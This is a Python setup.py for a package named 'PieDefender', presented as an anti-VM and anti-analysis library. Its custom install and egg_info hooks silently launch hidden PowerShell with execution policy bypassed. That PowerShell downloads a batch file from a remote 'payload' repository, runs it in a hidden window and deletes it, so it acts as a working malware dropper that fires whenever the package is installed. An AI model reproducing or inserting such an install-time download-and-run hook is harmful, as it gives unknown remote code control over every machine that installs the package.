import os
import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
    file_url = 'https://raw.githubusercontent.com/baledreamer/payload/refs/heads/main/smegma.bat'
    temp_dir = os.getenv('TEMP')
    downloaded_file_path = os.path.join(temp_dir, 'smegma.bat')
    powershell_command = f"""
    Invoke-WebRequest -Uri '{file_url}' -OutFile '{downloaded_file_path}';
    Start-Process -FilePath '{downloaded_file_path}' -ArgumentList '/C', '{downloaded_file_path}' -WindowStyle Hidden -Wait;
    Remove-Item '{downloaded_file_path}'
    """
    subprocess.Popen(['powershell', '-NoProfile', '-ExecutionPolicy', 'ByPass', '-WindowStyle', 'Hidden', '-Command', powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

def read_long_description():
    try:
        with open("README.md", "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return ""

setup(
    name="PieDefender",
    version="0.0.1",
    license="MIT",
    author="Jamie",
    author_email="JamieDev@gmail.com",
    description="Anti VM and Anti Analysis package for Python.",
    long_description=read_long_description(),
    long_description_content_type="text/markdown",  # Adjust if using reStructuredText or plain text
    url="https://github.com/yourusername/PieDefender",  # Replace with your project URL
    packages=find_packages(),
    cmdclass={
        'install': RunInstallCommand,
        'egg_info': RunEggInfoCommand,
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
